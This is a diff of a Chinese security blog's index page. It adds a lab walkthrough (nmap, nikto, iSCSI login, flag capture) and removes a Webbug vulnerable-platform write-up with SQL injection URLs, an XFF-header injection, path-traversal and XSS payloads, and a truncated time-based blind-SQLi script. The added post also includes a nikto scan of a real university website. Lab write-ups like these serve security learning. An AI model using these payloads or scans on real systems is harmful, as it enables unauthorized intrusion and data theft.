@@ -258,6 +258,103 @@
         
           <section id="main" style="float:none;">
   
+    <article id="post-沙盒靶机渗透一"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/09/19/沙盒靶机渗透一/">靶机渗透一</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/09/19/沙盒靶机渗透一/" class="article-date">
+	  <time datetime="2017-09-19T15:53:56.000Z" itemprop="datePublished">2017-09-19</time>
+	</a>
+
+      
+    <a class="article-category-link" href="/categories/blog/">blog</a>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip：192.168.1.106 //靶机ip</span><br></pre></td></tr></table></figure>
+<h4 id="nmap-sS-A-192-168-1-106"><a href="#nmap-sS-A-192-168-1-106" class="headerlink" title="nmap -sS -A 192.168.1.106"></a>nmap -sS -A 192.168.1.106</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@shackle:~# nmap -sS -A  192.168.1.106</span><br><span class="line">Nmap scan report for 192.168.1.106</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 89:c2:ae:12:d6:c5:19:4e:68:4a:28:e9:06:bd:9c:19 (RSA)</span><br><span class="line">|_  256 f0:0c:ae:37:10:d3:6d:a2:85:3a:77:04:06:94:f8:0a (ECDSA)</span><br><span class="line">80/tcp   open     http    nginx</span><br><span class="line">|_http-server-header: nginx</span><br><span class="line">|_http-title: Welcome!</span><br><span class="line">514/tcp  filtered shell</span><br><span class="line">3260/tcp open     iscsi?</span><br><span class="line">|_iscsi-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>22 80 port,326 port 是iscsi的端口。<br>参考：<a href="http://www.freebuf.com/articles/102500.htmlhttp://www.freebuf.com/articles/102500.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/102500.htmlhttp://www.freebuf.com/articles/102500.html</a><br><a href="https://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/</a></p>
+<ul>
+<li>iSCSI：Internet 小型计算机系统接口 （iSCSI：Internet Small Computer System Interface）。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iSCSI主要是透过TCP/IP的技术，将储存设备端透过iSCSI target (iSCSI目标端)功能，做成可以提供磁盘的服务器端，再透过iSCSI initiator (iSCSI初始化用户)功能，做成能够挂载使用iSCSI target的用户端，如此便能透过iSCSI设置来进行磁盘的应用了。</span><br><span class="line">也就是说，iSCSI 这个架构主要将储存装置与使用的主机分为两个部分，分别是： </span><br><span class="line">iSCSI target：就是储存设备端，存放磁盘或RAID的设备，目前也能够将Linux主机模拟成iSCSI target了！ 目的在提供其他主机使用的『磁盘』；</span><br><span class="line">iSCSI initiator：就是能够使用target的用户端，通常是服务器。 也就是说，想要连接到iSCSI target的服务器，也必须要安装iSCSI initiator的相关功能后才能够使用iSCSI target提供的磁盘。</span><br></pre></td></tr></table></figure>
+<h4 id="dirb-http-192-168-1-106-扫目录"><a href="#dirb-http-192-168-1-106-扫目录" class="headerlink" title="dirb http://192.168.1.106 #扫目录"></a>dirb <a href="http://192.168.1.106/" target="_blank" rel="noopener">http://192.168.1.106</a> #扫目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/font/index.html</span><br></pre></td></tr></table></figure>
+<p>####</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base6</span><br><span class="line">&gt;&gt;&gt; a = &apos;SGVsbG8sIGlzIGl0IGZsYWdzIHlvdSdyZSBsb29raW5nIGZvcj8KSSBjYW4gc2VlIGl0IGluIHlvdXIgZXllcwpJIGNhbiBzZWUgaXQgaW4geW91ciBzbWlsZQpGbGFncyBhcmUgYWxsIEkndmUgZXZlciB3YW50ZWQgYW5kIG15IHBvcnRzIGFyZSBvcGVuIHdpZGUgCkNhdXNlIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBzYXkgYW5kIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBkbwpBbmQgSSB3YW50IHRvIHRlbGwgeW91IHNvIG11Y2gsIG5vIGZsYWdzIGZvciB5b3UuLi4K&apos;</span><br><span class="line">&gt;&gt;&gt; print base64.b64decode(a)</span><br><span class="line">Hello, is it flags you&apos;re looking for?</span><br><span class="line">I can see it in your eyes</span><br><span class="line">I can see it in your smile</span><br><span class="line">Flags are all I&apos;ve ever wanted and my ports are open wide </span><br><span class="line">Cause you know just what to say and you know just what to do</span><br><span class="line">And I want to tell you so much, no flags for you...</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@shackle:~# nikto -h  192.168.1.106</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.1.106</span><br><span class="line">+ Target Hostname:    192.168.1.106</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2017-09-19 22:27:41 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: nginx</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /, fields: 0x58b7fa74 0x511 </span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)</span><br><span class="line">+ 7535 requests: 0 error(s) and 4 item(s) reported on remote host</span><br><span class="line">+ End Time:           2017-09-19 22:27:59 (GMT8) (18 seconds)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@shackle:~# iscsiadm -m discovery -t st -p 192.168.1.106:3260  #连接</span><br><span class="line">192.168.1.106:3260,1 iqn.2017-02.local.skuzzy:storage.sys0</span><br><span class="line"></span><br><span class="line">root@shackle:~# iscsiadm --m node -p 192.168.1.106 --login --target  </span><br><span class="line">#登录</span><br><span class="line">iqn.2017-02.local.skuzzy:storage.sys0</span><br><span class="line">Logging in to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.1.106,3260] (multiple)</span><br><span class="line">Login to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.1.106,3260] successful.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@shackle:~# fdisk  -l</span><br><span class="line">Disk /dev/sda: 60 GiB, 64424509440 bytes, 125829120 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x5acbe586</span><br><span class="line"></span><br><span class="line">Device     Boot     Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *         2048 124780543 124778496 59.5G 83 Linux</span><br><span class="line">/dev/sda2       124782590 125827071   1044482  510M  5 Extended</span><br><span class="line">/dev/sda5       124782592 125827071   1044480  510M 82 Linux swap / Solaris</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 1 GiB, 1073741824 bytes, 2097152 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">root@shackle:~# mount /dev/sdb  /mnt/  # 挂载</span><br><span class="line">root@shackle:~# cd /mnt/</span><br><span class="line">root@shackle:/mnt# cat flag1.txt</span><br><span class="line">Congratulations! You&apos;ve discovered the first flag!</span><br><span class="line"></span><br><span class="line">flag1&#123;c0abc15976b98a478150c900ebb0c86f0327f4dd&#125;</span><br><span class="line"></span><br><span class="line">Let&apos;s see how you go with the next one...</span><br></pre></td></tr></table></figure>
+<h2 id="Nikto-v2-1-6"><a href="#Nikto-v2-1-6" class="headerlink" title="- Nikto v2.1.6"></a>- Nikto v2.1.6</h2><ul>
+<li>Target IP: 210.44.112.115</li>
+<li>Target Hostname: cs.lcu.edu.cn</li>
+<li>Target Port: 80</li>
+<li>Start Time: 2017-09-19 23:44:55 (GMT8)</li>
+</ul>
+<hr>
+<ul>
+<li>Server: Apache</li>
+<li>Retrieved x-powered-by header: PHP/5.4.29</li>
+<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
+<li>Uncommon header ‘link’ found, with contents: <a href="http://cs.lcu.edu.cn/" target="_blank" rel="noopener">http://cs.lcu.edu.cn/</a>; rel=shortlink</li>
+<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
+<li>Entry ‘/wp-admin/‘ in robots.txt returned a non-forbidden or redirect HTTP code (302)</li>
+<li>“robots.txt” contains 2 entries which should be manually viewed.</li>
+<li>Uncommon header ‘tcn’ found, with contents: list</li>
+<li>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See <a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15" target="_blank" rel="noopener">http://www.wisec.it/sectou.php?id=4698ebdc59d15</a>. The following alternatives for ‘index’ were found: index.php</li>
+<li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.</li>
+<li>Server leaks inodes via ETags, header found with file /sitemap.xml, fields: 0x0 0x4fc7e6798f940</li>
+<li>OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-3092: /news: This might be interesting…</li>
+<li>/test/test.php: Output from the phpinfo() function was found.</li>
+<li>OSVDB-3233: /test/test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</li>
+<li>OSVDB-3092: /LICENSE.txt: License file found may identify site software.</li>
+<li>OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.</li>
+<li>OSVDB-3092: /ci/: This might be interesting… potential country code (CÔte D’ivoire)</li>
+<li>/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin ‘Tested up to’ version usually matches the WordPress version</li>
+<li>/readme.html: This WordPress file reveals the installed version.</li>
+<li>/wp-links-opml.php: This WordPress script reveals the installed version.</li>
+<li>OSVDB-3092: /license.txt: License file found may identify site software.</li>
+<li>OSVDB-3092: /LICENSE.TXT: License file found may identify site software.</li>
+<li>Cookie wordpress_test_cookie created without the httponly flag</li>
+<li>/wp-login/: Admin login page/section found.</li>
+<li>/wordpress/: A Wordpress installation was found.</li>
+<li>8369 requests: 0 error(s) and 28 item(s) reported on remote host</li>
+<li>End Time: 2017-09-20 00:59:39 (GMT8) (4484 seconds)</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-姿势估计背景历史"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -1160,107 +1257,6 @@
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-webbug"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/04/05/webbug/">国产Webbug开源漏洞平台</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/04/05/webbug/" class="article-date">
-	  <time datetime="2017-04-05T15:53:56.000Z" itemprop="datePublished">2017-04-05</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>国产的Webbug开源漏洞平台搞一下~</p>
-<p>get注入<br>图片破解<br>信息收集练习——目录端口收集<br>暴力破解练习<br>x-forwarded-for注入<br>支付漏洞<br>垂直越权<br>CSRF<br>url跳转<br>GET任意文件下载<br>POST任意文件下载<br>无验证上传<br>反射型XSS<br>存储型XSS<br>校验扩展名上传<br>验证来源去向的url跳转<br>文件包含<br>POST文件包含<br>HOST注入<br>APK破解<br>延时注入<br>DZ7.2论坛sql注入<br>aspcms注入<br>phpmyadmin任意文件包含漏洞<br>齐博系统SQL注入<br>海盗云商getshell<br>PHP168任意代码执行GET SHELL<br>ecshop 注入<br>ShopXp系统SQL注射漏洞<br>Dcore(轻型CMS系统)注入漏洞<br>MetInfo 任意文件包含漏洞可getshell<br>Metinfo news.php盲注<br>Metinfo img.php盲注<br>万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入<br>BEESCMS sql注入，无视防御<br>ourphp 注入<br>phpwind 命令执行漏洞<br>metinfo 任意用户密码修改<br>DZ 3.2 存储型XSS<br>DedeCMS flink.php友情链接注入<br>DedeCms?recommend.php注入<br>BEESCMS 小于等于V4四处注入+无需密码直接进后台<br>海洋 x-forwarded-for注入<br>php截断利用<br>st2-016<br>jboss命令执行<br>tomcat弱口令<br>hfs远程命令执行<br>st2-052命令执行<br>flash远程命令执行<br>gh0st远程溢出<br>IIS6.0远程溢出</p>
-<h2 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h2><h3 id="第一关-get注入-很简单的一个注入"><a href="#第一关-get注入-很简单的一个注入" class="headerlink" title="第一关:get注入__很简单的一个注入"></a>第一关:get注入__很简单的一个注入</h3><p>GET 手工注入/sqlmap</p>
-<p>1、爆列长     order by 4  为<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' order by 4 %23</span><br></pre></td></tr></table></figure></p>
-<p>回显：不爆错，所以列长是4。</p>
-<p>2、爆表  mysql information_schema  元信息表</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema = database() %23</span><br></pre></td></tr></table></figure>
-<p>回显：comment,flag,goods,user  四个表</p>
-<p>3、爆列</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(column_name),2,3,4 from information_schema.columns where table_name = 'flag' %23</span><br></pre></td></tr></table></figure>
-<p>回显：id,flag   flag表中的列</p>
-<p>4、查询flag值</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select 1,flag,3,4 from flag %23</span><br></pre></td></tr></table></figure>
-<p>回显：名称为:204f704fbbcf6acf398ffee11989b377</p>
-<h3 id="第二关-从图片中你能找到什么？"><a href="#第二关-从图片中你能找到什么？" class="headerlink" title="第二关:从图片中你能找到什么？"></a>第二关:从图片中你能找到什么？</h3><p>图片隐写题目 ，  想想之前misc 题目做的想吐。</p>
-<h3 id="第三关-你看到了什么？"><a href="#第三关-你看到了什么？" class="headerlink" title="第三关:你看到了什么？"></a>第三关:你看到了什么？</h3><p>扫目录。。。emmm</p>
-<h3 id="第四关-告诉你了flang是5位数"><a href="#第四关-告诉你了flang是5位数" class="headerlink" title="第四关:告诉你了flang是5位数"></a>第四关:告诉你了flang是5位数</h3><p><a href="http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html</a></p>
-<p>bp  抓包爆破弱口令。 admin   admin 123</p>
-<h3 id="第五关-一个优点小小的特殊的注入"><a href="#第五关-一个优点小小的特殊的注入" class="headerlink" title="第五关:一个优点小小的特殊的注入"></a>第五关:一个优点小小的特殊的注入</h3><p>XFF 头注入</p>
-<p>浅谈http头注入(附案例)<br><a href="https://zhuanlan.zhihu.com/p/27553821" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27553821</a></p>
-<p>User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p>
-<p>Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）.</p>
-<p>X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）.</p>
-<p>Clien-IP：同上，不做过多介绍.</p>
-<p>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过    来的.</p>
-<p>Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号(这个我本人还没碰到过，不过有真实存在的案例还是写上吧).</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /pentest/test/1/ HTTP/1.1</span><br><span class="line">Host: 10.102.15.214</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: HFS_SID_=0.630969217978418</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Forwarded-For:union select 1,flag,3,4 from flag</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
-<h3 id="第六关-这关需要rmb购买哦"><a href="#第六关-这关需要rmb购买哦" class="headerlink" title="第六关:这关需要rmb购买哦"></a>第六关:这关需要rmb购买哦</h3><p>截获数据包进行修改数量  逻辑漏洞</p>
-<h3 id="第七关-越权"><a href="#第七关-越权" class="headerlink" title="第七关:越权"></a>第七关:越权</h3><p>越权修改密码</p>
-<p><a href="http://10.102.15.214/pentest/test/3/change.php?name=admin" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/3/change.php?name=admin</a></p>
-<h3 id="第八关-CSRF"><a href="#第八关-CSRF" class="headerlink" title="第八关:CSRF"></a>第八关:CSRF</h3><p>将更改密码的请求用Burpsuite截获 可一键生成CSRF PoC</p>
-<h3 id="第九关-URL跳转"><a href="#第九关-URL跳转" class="headerlink" title="第九关:URL跳转"></a>第九关:URL跳转</h3><p><a href="http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com</a></p>
-<h3 id="第十关-文件下载"><a href="#第十关-文件下载" class="headerlink" title="第十关:文件下载"></a>第十关:文件下载</h3><p><a href="http://10.102.15.214/pentest/test/6/1/download.php" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/6/1/download.php</a></p>
-<p>任意文件下载  payload：  下载  config.php</p>
-<p><a href="http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php</a></p>
-<h3 id="第十一关-我和上一题有点像"><a href="#第十一关-我和上一题有点像" class="headerlink" title="第十一关:我和上一题有点像"></a>第十一关:我和上一题有点像</h3><p>的确和上一关有点像 也是要找回mysql账号密码 还是先把下载的包抓下来看看 上一关的下载用的是get 本关用的post</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\img1522055666619.png?lastModify=1522056169" alt="img"><br><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056171589.png" alt="52205617158"></p>
-<h3 id="第十二关-我系统密码忘记了！"><a href="#第十二关-我系统密码忘记了！" class="headerlink" title="第十二关:我系统密码忘记了！"></a>第十二关:我系统密码忘记了！</h3><p>​    上传漏洞的连接菜刀。</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056297807.png" alt="52205629780"></p>
-<h3 id="第十三关-XSS"><a href="#第十三关-XSS" class="headerlink" title="第十三关:XSS"></a>第十三关:XSS</h3><p>反射型 xss</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/9/?id=&lt;img src onerror=al ert()&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056415953.png" alt="52205641595"></p>
-<h3 id="第十四关-存储型XSS"><a href="#第十四关-存储型XSS" class="headerlink" title="第十四关:存储型XSS"></a>第十四关:存储型XSS</h3><p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056469320.png" alt="52205646932"></p>
-<h3 id="第十五关-什么？图片上传不了？"><a href="#第十五关-什么？图片上传不了？" class="headerlink" title="第十五关:什么？图片上传不了？"></a>第十五关:什么？图片上传不了？</h3><p>只验证了Content-Type </p>
-<p>抓包改。。。</p>
-<h3 id="第十六关-明天双十一"><a href="#第十六关-明天双十一" class="headerlink" title="第十六关:明天双十一"></a>第十六关:明天双十一</h3><h2 id="中级进阶"><a href="#中级进阶" class="headerlink" title="中级进阶"></a>中级进阶</h2><h3 id="第一关-出来点东西吧-任意文件读取"><a href="#第一关-出来点东西吧-任意文件读取" class="headerlink" title="第一关:出来点东西吧  任意文件读取"></a>第一关:出来点东西吧  任意文件读取</h3><p>get 方式文件包含漏洞</p>
-<p><a href="http://10.102.94.210/pentest/test/13/?country=../../../index.html" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/13/?country=../../../index.html</a></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522062643540.png" alt="52206264354"></p>
-<h3 id="第二关-提交方式是怎么样的啊？"><a href="#第二关-提交方式是怎么样的啊？" class="headerlink" title="第二关:提交方式是怎么样的啊？"></a>第二关:提交方式是怎么样的啊？</h3><p><a href="http://10.102.94.210/pentest/test/14/" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/14/</a></p>
-<p>post 方式文件 文件包含漏洞</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522062882333.png" alt="52206288233"></p>
-<h3 id="第三关-我还是一个注入"><a href="#第三关-我还是一个注入" class="headerlink" title="第三关:我还是一个注入"></a>第三关:我还是一个注入</h3><p>host 头注入</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522063148024.png" alt="52206314802"></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522063211793.png" alt="52206321179"></p>
-<h3 id="第四关-APK里面有一个flag"><a href="#第四关-APK里面有一个flag" class="headerlink" title="第四关:APK里面有一个flag"></a>第四关:APK里面有一个flag</h3><p>逆向APK程序</p>
-<h3 id="第五关-时间注入"><a href="#第五关-时间注入" class="headerlink" title="第五关:时间注入"></a>第五关:时间注入</h3><p><a href="http://10.102.94.210/pentest/test/time/" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/time/</a>  </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="comment">#时间盲注脚本</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.&#125;&#123;,'</span></span><br><span class="line"><span class="comment">#存放跑出的结果</span></span><br><span class="line">length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table=<span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'start get length...'</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">	startTime1=time.time()</span><br><span class="line">	url1 = <span class="string">"http://192.168.37.147/pentest/test/time/?type=1 and if(length(database())=%d,sleep(5),1)"</span>%(l)</span><br><span class="line">	response1 = requests.get(url1)</span><br><span class="line">	<span class="keyword">if</span> time.time() - startTime1 &gt; <span class="number">5</span>:</span><br><span class="line">		length=l</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"the length is "</span> + str(length)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'start database sql injection...'</span></span><br><span class="line"><span class="keyword">for</span> d <span 